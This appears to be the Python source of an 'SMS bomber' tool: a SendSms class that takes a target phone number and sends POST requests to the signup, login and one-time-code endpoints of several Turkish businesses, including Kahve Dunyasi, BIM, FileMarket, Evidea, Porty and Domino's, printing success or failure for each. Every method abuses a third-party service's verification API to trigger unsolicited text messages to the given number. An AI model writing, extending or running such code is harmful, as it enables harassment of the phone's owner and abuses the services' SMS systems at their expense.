import requests
from colorama import Fore

class SendSms():
    def __init__(self, phone, mail=None):
        self.phone = phone

    def log(self, name, status):
        if status: print(f"{Fore.CYAN}[✓] {Fore.WHITE}{name} Gönderildi.")
        else: print(f"{Fore.RED}[×] {Fore.WHITE}{name} Başarısız.")

    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", json={"countryCode": "90", "phoneNumber": self.phone}, timeout=2)
            self.log("KahveDunyasi", r.status_code == 200)
        except: pass

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=2)
            self.log("BIM", r.status_code == 200)
        except: pass

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send", json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=2)
            self.log("FileMarket", r.json().get("responseType") == "SUCCESS")
        except: pass

    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com/users/register/", data={"phone": f"0{self.phone}"}, timeout=2)
            self.log("Evidea", r.status_code == 202)
        except: pass

    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech/api.php", json={"job": "start_login", "phone": self.phone}, timeout=2)
            self.log("Porty", "success" in r.text.lower())
        except: pass

    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", json={"mobilePhone": self.phone}, timeout=2)
            self.log("Dominos", r.json().get("isSuccess") == True)
        except: pass

